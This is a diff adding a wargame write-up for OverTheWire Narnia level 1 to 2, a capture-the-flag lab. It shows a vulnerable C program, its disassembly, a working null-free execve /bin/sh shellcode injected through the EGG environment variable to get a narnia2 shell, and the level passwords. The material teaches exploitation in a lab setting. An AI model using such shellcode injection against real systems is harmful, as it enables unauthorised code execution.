@@ -131,3 +131,134 @@ Sweet, it worked. Now I can just `cat /etc/narnia_pass/narnia1`.
 efeidiedae
 </p>
 </details>
+
+
+## level 1 -> 2
+
+Running the narnia1 executable produces the following output:
+```
+narnia1@narnia:/narnia$ ./narnia1
+Give me something to execute at the env-variable EGG
+```
+
+Naively setting EGG on the command line to a command (ls) segfaults. Time to look at the code.
+
+The program checks for an environmet variable called 'EGG'. If it's found, it's stored to the funtion pointer ret, and then called.
+```
+#include <stdio.h>
+
+int main(){
+    int (*ret)();
+
+    if(getenv("EGG")==NULL){
+        printf("Give me something to execute at the env-variable EGG\n");
+        exit(1);
+    }
+
+    printf("Trying to execute EGG!\n");
+    ret = getenv("EGG");
+    ret();
+
+    return 0;
+}
+```
+
+A refresher on function pointers. `int (*ret)();` means that ret is a pointer to a function that takes no args and returns an int. It must be initialized to an address of a function in the program. Which explains why I made the program segfault by setting EGG to a command.
+
+But what's happening under the hood? Take a look at some of the assembly:
+```
+ 80484a3:	68 40 85 04 08       	push   $0x8048540
+ 80484a8:	e8 73 fe ff ff       	call   8048320 <getenv@plt>
+ 80484ad:	83 c4 04             	add    $0x4,%esp
+ 80484b0:	89 45 fc             	mov    %eax,-0x4(%ebp)
+ 80484b3:	8b 45 fc             	mov    -0x4(%ebp),%eax
+ 80484b6:	ff d0                	call   *%eax
+ ```
+getenv is called with EGG and the return value is saved. Next is a call instruction to what the address that's in eax points to.
+
+So obviously, I can make EGG refer to a function that's already compiled into the program, but looking through the disassembled binary, I don't see anything really useful. My next step is to start searching online for ways to abuse function pointers.
+
+And of course it turns out there are ways to do this. Namely, injecting [Shellcode](https://en.wikipedia.org/wiki/Shellcode). The idea is to take a small program that executes a shell (or something else), compile it, and get the machine code loaded into the program and into a function pointer.
+
+Ok, so my first try is to write a simple c program:
+```
+#include <stdio.h>
+
+int main( ) {
+	char *name[2];
+	name[0] = "/bin/sh";
+	name[1] = NULL;
+	execve(name[0], name, NULL);
+}
+```
+
+Compile it (`gcc -m32 attack.c -o attack`), and get the assembly using `objdump -D -m i386 -M intel  attack`:
+```
+000005a0 <main>:
+ 5a0:	8d 4c 24 04          	lea    ecx,[esp+0x4]
+ 5a4:	83 e4 f0             	and    esp,0xfffffff0
+ 5a7:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
+ 5aa:	55                   	push   ebp
+ 5ab:	89 e5                	mov    ebp,esp
+ 5ad:	53                   	push   ebx
+ 5ae:	51                   	push   ecx
+ 5af:	83 ec 10             	sub    esp,0x10
+ 5b2:	e8 3b 00 00 00       	call   5f2 <__x86.get_pc_thunk.ax>
+ 5b7:	05 49 1a 00 00       	add    eax,0x1a49
+ 5bc:	8d 90 80 e6 ff ff    	lea    edx,[eax-0x1980]
+ 5c2:	89 55 f0             	mov    DWORD PTR [ebp-0x10],edx
+ 5c5:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [ebp-0xc],0x0
+ 5cc:	8b 55 f0             	mov    edx,DWORD PTR [ebp-0x10]
+ 5cf:	83 ec 04             	sub    esp,0x4
+ 5d2:	6a 00                	push   0x0
+ 5d4:	8d 4d f0             	lea    ecx,[ebp-0x10]
+ 5d7:	51                   	push   ecx
+ 5d8:	52                   	push   edx
+ 5d9:	89 c3                	mov    ebx,eax
+ 5db:	e8 30 fe ff ff       	call   410 <execve@plt>
+ 5e0:	83 c4 10             	add    esp,0x10
+ 5e3:	b8 00 00 00 00       	mov    eax,0x0
+ 5e8:	8d 65 f8             	lea    esp,[ebp-0x8]
+ 5eb:	59                   	pop    ecx
+ 5ec:	5b                   	pop    ebx
+ 5ed:	5d                   	pop    ebp
+ 5ee:	8d 61 fc             	lea    esp,[ecx-0x4]
+ 5f1:	c3                   	ret    
+```
+Using `xxd attack` to find the hex for the strings:
+`00000680: 2f62 696e 2f73 6800 011b 033b 3800 0000  /bin/sh....;8...`
+
+Taking the bytes (in hex) and attempting to save this to EGG, I encounter a problem: Null bytes. Bash does not like them.
+
+And of course (luckily for me), this is a well-known problem. I found [some](https://nets.ec/Shellcode/Null-free) [great](http://www.cis.syr.edu/~wedu/Teaching/CompSec/LectureNotes_New/Buffer_Overflow.pdf) [references](http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/shellcode-walkthrough) online that talk about this. But the highlight has to be the [shell-storm shellcode collection](http://shell-storm.org/shellcode/).
+
+I picked out a [tiny execve sh example](http://shell-storm.org/shellcode/files/shellcode-841.php) to test out.
+
+First, I will use perl to stash the hex bytes in EGG:
+```
+narnia1@narnia:/tmp/ww$ export EGG=$(perl -e 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"') 
+narnia1@narnia:/tmp/ww$ echo $EGG
+1???
+    Qh//shh/bin??̀
+
+```
+
+Running narnia1 doesn't segfault, but wait...it asks me to provide something to EGG. So it doesn't pick up my environment variable. Hmmm...
+
+That is annoying, but further investigation shows that you can actually pass environment variables into a program on the command line:
+``
+narnia1@narnia:/narnia$ EGG=$(perl -e 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"') ./narnia1
+Trying to execute EGG!
+$ whoami
+narnia2
+$ cat /etc/narnia_pass/narnia2
+``
+<details><summary>Password</summary>
+	<p>	
+nairiepecu
+</p>
+</details>
+
+That was super cool. 
+
+
